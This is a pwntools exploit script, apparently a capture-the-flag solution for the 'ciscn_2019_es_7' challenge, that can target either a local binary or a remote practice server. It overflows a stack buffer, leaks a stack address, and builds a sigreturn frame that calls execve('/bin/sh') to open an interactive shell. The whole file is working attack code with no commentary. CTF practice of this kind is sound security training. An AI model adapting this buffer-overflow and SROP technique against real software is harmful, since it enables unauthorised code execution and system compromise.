from pwn import *

context(arch='amd64', os='linux', log_level='debug')

file_name = './70_ciscn_2019_es_7'

debug = 0
if debug:
    r = remote('node4.buuoj.cn', 26235)
else:
    r = process(file_name)

elf = ELF(file_name)

def dbg():
    gdb.attach(r)

vuln = 0x04004ED

p1 = b'a' * 0x10 + p64(vuln)
r.sendline(p1)
stack_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))
success('stack_addr = ' + hex(stack_addr))

#buf_addr = stack_addr - 0x128
buf_addr = stack_addr - 0x118
success('buf_addr = ' + hex(buf_addr))

syscall_ret = 0x400517
sigret = 0x4004DA

sigframe = SigreturnFrame()
sigframe.rax = constants.SYS_execve
sigframe.rdi = buf_addr
sigframe.rsi = 0x0
sigframe.rdx = 0x0
sigframe.rsp = stack_addr
sigframe.rip = syscall_ret

p1 = b'/bin/sh' + b'\x00' * (0x1 + 0x8)
p1 += p64(sigret) + p64(syscall_ret) + bytes(sigframe)

r.send(p1)

r.interactive()
